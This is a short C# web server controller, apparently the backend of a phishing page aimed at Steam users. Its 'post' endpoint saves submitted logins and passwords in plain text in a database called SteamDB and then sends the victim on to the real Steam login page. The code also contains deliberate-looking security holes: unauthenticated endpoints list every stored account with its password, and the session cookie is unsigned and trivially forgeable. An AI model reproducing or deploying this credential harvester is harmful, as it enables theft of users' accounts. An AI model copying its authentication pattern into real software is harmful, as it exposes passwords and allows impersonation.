using WebServer.Attributes;
using System.Data.SqlClient;
using System.Net;

namespace WebServer.Controllers
{
    [ApiController]
    public class Accounts
    {
        private readonly IAccountRepository _db = 
            new AccountRepository(@"Data Source=(localdb)\MSSQLLocalDB;Initial Catalog=SteamDB;Integrated Security=True;");

        [HttpGET("list")]
        public List<Account> GetAccounts()
        {
            return _db.Query(new AccountSpecification());
        }

        [HttpGET("item")]
        public Account GetAccountById(int id)
        {
            return _db.Query(new AccountSpecificationById(id)).FirstOrDefault();
        }

        [HttpPOST("post")]
        public void SaveAccounts(string login, string password, HttpListenerResponse response)
        {
            _db.InsertAccount(new Account() { Login = login, Password = password });
            response.Redirect("https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_4__global-header");
        }

        [HttpPOST("login")]
        public bool Login(string login, string password, HttpListenerResponse response)
        {
            var account = _db.Query(new AccountSpecificationByLoginPassword(login, password));
            if (account.Count() > 0)
            {
                response.Headers.Set("Set-Cookie", "SessionId={IsAuthorize: true, Id="
                    + account.First().Id.ToString() + "}; Path=/");
                return true;
            }
            return false;
        }
    }

    public class Account
    {
        public int Id { get; set; }
        public string Login { get; set; }
        public string Password { get; set; }
    }
}
